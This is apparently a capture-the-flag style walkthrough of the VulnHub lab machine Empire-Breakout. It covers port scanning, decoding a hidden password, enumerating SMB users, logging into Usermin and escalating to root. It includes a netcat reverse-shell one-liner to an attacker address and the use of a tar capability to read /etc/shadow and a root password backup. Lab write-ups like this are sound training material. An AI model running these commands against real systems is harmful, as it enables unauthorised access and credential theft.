---
layout: post
title: Empire-Breakout
categories: VulnHub Machines
permalink: /vulnhub/empire-breakout
---

Author: Icex64 & Empire Cybersecurity

## Nmap

```bash
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-09 02:53 UTC
Nmap scan report for 192.168.56.135
Host is up (0.00092s latency).
Not shown: 65530 closed tcp ports (reset)
PORT      STATE SERVICE     VERSION
80/tcp    open  http        Apache httpd 2.4.51 ((Debian))
|_http-server-header: Apache/2.4.51 (Debian)
|_http-title: Apache2 Debian Default Page: It works
139/tcp   open  netbios-ssn Samba smbd 4.6.2
445/tcp   open  netbios-ssn Samba smbd 4.6.2
10000/tcp open  http        MiniServ 1.981 (Webmin httpd)
|_http-title: 200 &mdash; Document follows
20000/tcp open  http        MiniServ 1.830 (Webmin httpd)
|_http-title: 200 &mdash; Document follows
MAC Address: 08:00:27:A2:1E:2A (Oracle VirtualBox virtual NIC)
Device type: general purpose
Running: Linux 4.X|5.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
OS details: Linux 4.15 - 5.8
Network Distance: 1 hop

Host script results:
| smb2-time: 
|   date: 2025-01-09T02:53:44
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
|_clock-skew: -2s
|_nbstat: NetBIOS name: BREAKOUT, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)

TRACEROUTE
HOP RTT     ADDRESS
1   0.92 ms 192.168.56.135

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 46.84 seconds
```

## Port 80

![image.png](https://prod-files-secure.s3.us-west-2.amazonaws.com/fc3a63cb-9633-4515-9432-fe1dc9c08dfe/15fa14b6-bd33-4c80-ae2e-d0577e3b7715/image.png)

We are greeted with the apache2 default page. Nothing too special on the page. Let’s look at the source code to see if we find anything.

### Source Code

```html
<!--
don't worry no one will get here, it's safe to share with you my access. Its encrypted :)

++++++++++[>+>+++>+++++++>++++++++++<<<<-]>>++++++++++++++++.++++.>>+++++++++++++++++.----.<++++++++++.-----------.>-----------.++++.<<+.>-.--------.++++++++++++++++++++.<------------.>>---------.<<++++++.++++++.

-->
```

We can find the above comment hidden within the source code of the page. The weird looking string is encoded using the Brainf**k cipher. Decoding it we get the below string

```bash
.2uqPEfj3D<P'a-3
```

It seems this could be a password to an account. Let’s visit the other ports where we saw MiniServ running.

## Port 10000

![image.png](https://prod-files-secure.s3.us-west-2.amazonaws.com/fc3a63cb-9633-4515-9432-fe1dc9c08dfe/dcc8a846-f488-4f3f-beed-f7879cc66cf7/image.png)

We are greeted with a login page. We can try to login with the password we obtained earlier. Using admin as the user with the password doesn’t work. This means that we need to look for a valid username.

If we look back at the nmap scan we can see that smb is running. We can use enum4linux to find valid users

## enum4linux

```bash
enum4linux -r 192.168.56.135
Starting enum4linux v0.9.1 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Thu Jan  9 03:10:36 2025

 =========================================( Target Information )=========================================
                                                                                                                                                                                                                                            
Target ........... 192.168.56.135                                                                                                                                                                                                           
RID Range ........ 500-550,1000-1050
Username ......... ''
Password ......... ''
Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none

<SNIP>                                                                                                                                                                        

[+] Enumerating users using SID S-1-22-1 and logon username '', password ''                                                                                                                                                                 
                                                                                                                                                                                                                                            
S-1-22-1-1000 Unix User\cyber (Local User)                                                                                                                                                                                                  

<SNIP>

enum4linux complete on Thu Jan  9 03:10:49 2025
```

We can see that there is a local user with the username cyber. Let’s try using that as our username on the Webmin login page.

![image.png](https://prod-files-secure.s3.us-west-2.amazonaws.com/fc3a63cb-9633-4515-9432-fe1dc9c08dfe/3d4f6737-6564-4e34-8f7d-423c15ff0547/image.png)

Well, that didn’t work. There is another service Usernmin running on port 20000. We can check to see if the credentials work there.

![image.png](https://prod-files-secure.s3.us-west-2.amazonaws.com/fc3a63cb-9633-4515-9432-fe1dc9c08dfe/9ddef0c8-0342-4f37-8bdf-216b9b4a1e12/image.png)

And there we go, we are now logged in onto Usermin. We can now use the inbuilt terminal to run commands on the server.

![image.png](https://prod-files-secure.s3.us-west-2.amazonaws.com/fc3a63cb-9633-4515-9432-fe1dc9c08dfe/9b590a03-9533-48c3-b6af-4aa98db0721a/image.png)

Let us get a more interactive shell by using netcat.

```bash
[cyber@breakout ~]$ rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 192.168.56.103 4242 >/tmp/f
```

![image.png](https://prod-files-secure.s3.us-west-2.amazonaws.com/fc3a63cb-9633-4515-9432-fe1dc9c08dfe/445c75bc-a961-4ad2-8657-0931947eba2b/image.png)

After getting a more interactive shell using python, we get the user.txt file.

Now time to escalate the privileges.

## Priv Esc

We can see that there is a binary for the tar program there. Which is likely our way to root.

![image.png](https://prod-files-secure.s3.us-west-2.amazonaws.com/fc3a63cb-9633-4515-9432-fe1dc9c08dfe/93f8a00c-5ea0-4f3e-93a1-c6a130cac7cd/image.png)

My first thought was that maybe we have sudo as root on the tar binary. But sudo was disabled so we can’t do that.

We can use getcap to see what capabilities the binary has.

![image.png](https://prod-files-secure.s3.us-west-2.amazonaws.com/fc3a63cb-9633-4515-9432-fe1dc9c08dfe/65f29b93-5210-4aa0-aea6-4144e2773e5f/image.png)

The cap_dac_read_search capability allows us to bypass file read permissions.

We can try and see if we can read the /etc/shadow file.

![image.png](https://prod-files-secure.s3.us-west-2.amazonaws.com/fc3a63cb-9633-4515-9432-fe1dc9c08dfe/48dde4a3-e4b9-48f5-b8cb-5da9ff539af8/image.png)

And sure enough we can.

We can try and crack the hashes offline, but considering the password for cyber was complex, we can see if we have any other way.

Since we can read any file as root, we can look for interesting files owned by root in any of the usual places such as /var/backup or /opt.

![image.png](https://prod-files-secure.s3.us-west-2.amazonaws.com/fc3a63cb-9633-4515-9432-fe1dc9c08dfe/2ccc6616-798e-4656-867c-e43669c1745d/image.png)

Looking at /var/backup we can see a .old_pass.bak file which is readable only by root.

Let’s use out tar binary to read this file.

![image.png](https://prod-files-secure.s3.us-west-2.amazonaws.com/fc3a63cb-9633-4515-9432-fe1dc9c08dfe/78c1ced4-3e8d-49bc-8da0-6bc71b8acd92/image.png)

We seem to get a complex looking password.

Let’s try to su to root using this pass.

![image.png](https://prod-files-secure.s3.us-west-2.amazonaws.com/fc3a63cb-9633-4515-9432-fe1dc9c08dfe/2381d0bc-04d1-4cf1-97ec-a2710231d95b/image.png)

And there we go, we finally have root

![image.png](https://prod-files-secure.s3.us-west-2.amazonaws.com/fc3a63cb-9633-4515-9432-fe1dc9c08dfe/fd904eab-e1a0-41ff-8a10-455123c79302/image.png)

https://www.vulnhub.com/entry/empire-breakout,751/
